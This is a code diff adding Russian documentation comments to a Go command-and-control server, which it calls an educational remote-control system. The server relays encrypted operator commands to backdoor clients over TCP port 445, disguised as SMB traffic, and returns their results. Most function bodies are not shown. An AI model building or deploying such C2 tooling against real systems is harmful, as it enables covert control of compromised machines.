@@ -1,3 +1,7 @@
+// Package main реализует C2-сервер — промежуточный узел учебной
+// системы удалённого управления. Сервер одновременно обслуживает:
+//   - HTTP-эндпоинты для терминала оператора (приём команд и выдача статусов);
+//   - TCP-сервер на порту 445 для клиентов-бэкдоров (обмен в формате псевдо-SMB).
 package main
 
 import (
@@ -13,28 +17,35 @@ import (
 	"c2project/shared"
 )
 
+// Client описывает зарегистрированного клиента-бэкдора.
 type Client struct {
-	ID       string
-	Hostname string
-	OS       string
-	LastSeen time.Time
+	ID       string    // Уникальный идентификатор клиента (hostname-OS-username)
+	Hostname string    // Имя хоста клиента
+	OS       string    // Название операционной системы клиента
+	LastSeen time.Time // Время последнего обращения клиента к C2
 }
 
+// Task описывает задачу — команду, отправленную оператором,
+// и результат её выполнения на клиенте.
 type Task struct {
-	ID       string
-	ClientID string
-	Command  []byte
-	Result   []byte
-	Status   string
+	ID       string // Уникальный идентификатор задачи
+	ClientID string // Идентификатор клиента, которому предназначена задача
+	Command  []byte // Зашифрованная команда (ключ KeyC2ToClient)
+	Result   []byte // Зашифрованный результат выполнения
+	Status   string // Статус: pending (в очереди) или done (выполнено)
 }
 
+// Store — потокобезопасное in-memory хранилище данных C2-сервера.
+// Базы данных не используются, всё хранится в оперативной памяти процесса.
 type Store struct {
-	mu      sync.Mutex
-	clients map[string]*Client
-	tasks   map[string]*Task
-	queues  map[string][]string
+	mu      sync.Mutex          // Мьютекс для защиты одновременного доступа
+	clients map[string]*Client  // Реестр клиентов: ID -> Client
+	tasks   map[string]*Task    // Все задачи: TaskID -> Task
+	queues  map[string][]string // Очереди задач по клиентам: ClientID -> [TaskID]
 }
 
+// NewStore создаёт и инициализирует новое хранилище Store.
+// Возвращает указатель на готовый к использованию Store.
 func NewStore() *Store {
 	return &Store{
 		clients: make(map[string]*Client),
@@ -43,8 +54,17 @@ func NewStore() *Store {
 	}
 }
 
+// Глобальный экземпляр хранилища, используемый всеми обработчиками.
 var store = NewStore()
 
+// handleSubmit обрабатывает HTTP-запрос от терминала на постановку задачи.
+// Ожидает POST с JSON {"client_id": ..., "command": base64(enc)}.
+// Логика:
+//  1. Проверяет, что клиент с указанным ID зарегистрирован.
+//  2. Декодирует base64 и расшифровывает команду первым ключом (KeyTerminalToC2).
+//  3. Перешифровывает команду вторым ключом (KeyC2ToClient).
+//  4. Создаёт задачу, кладёт её в tasks и добавляет ID в очередь клиента.
+//  5. Возвращает JSON {"task_id": ...}.
 func handleSubmit(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
@@ -102,6 +122,10 @@ func handleSubmit(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(resp)
 }
 
+// handleStatus обрабатывает GET-запрос терминала о статусе задачи.
+// Ожидает query-параметр id с идентификатором задачи.
+// Если задача выполнена, возвращает результат, перешифрованный
+// первым ключом (KeyTerminalToC2) и закодированный в base64.
 func handleStatus(w http.ResponseWriter, r *http.Request) {
 	taskID := r.URL.Query().Get("id")
 	if taskID == "" {
@@ -134,6 +158,8 @@ func handleStatus(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(resp)
 }
 
+// handleClients обрабатывает GET-запрос терминала на получение
+// списка зарегистрированных клиентов. Возвращает JSON-массив ClientInfo.
 func handleClients(w http.ResponseWriter, r *http.Request) {
 	store.mu.Lock()
 	list := make([]shared.ClientInfo, 0, len(store.clients))
@@ -150,6 +176,16 @@ func handleClients(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(list)
 }
 
+// handleClient обслуживает одно TCP-соединение от клиента-бэкдора.
+// Параметр conn — активное TCP-соединение.
+// Логика:
+//  1. Читает пакет регистрации, расшифровывает данные (hostname, OS).
+//  2. Регистрирует клиента в store, отправляет подтверждение CmdRegisterAck.
+//  3. В цикле принимает пакеты:
+//     - CmdGetTask — выдаёт следующую задачу из очереди (или пустой пакет);
+//     - CmdSendResult — сохраняет результат, помечает задачу как done,
+//       отправляет подтверждение CmdResultAck.
+// При разрыве соединения завершает горутину.
 func handleClient(conn net.Conn) {
 	defer conn.Close()
 	log.Printf("[C2] Новое TCP-соединение от %s", conn.RemoteAddr())
@@ -252,6 +288,8 @@ func handleClient(conn net.Conn) {
 	}
 }
 
+// splitRegistration разбивает строку вида "id|hostname|os" на части
+// по символу-разделителю '|'. Возвращает срез строк.
 func splitRegistration(s string) []string {
 	var parts []string
 	cur := ""
@@ -269,6 +307,10 @@ func splitRegistration(s string) []string {
 	return parts
 }
 
+// main — точка входа C2-сервера.
+// Запускает в горутине HTTP-сервер на порту 8080 для терминала оператора,
+// а в основном потоке — TCP-сервер на порту 445 для клиентов-бэкдоров.
+// Каждое входящее TCP-соединение обрабатывается в отдельной горутине.
 func main() {
 	http.HandleFunc(shared.EndpointSubmit, handleSubmit)
 	http.HandleFunc(shared.EndpointStatus, handleStatus)
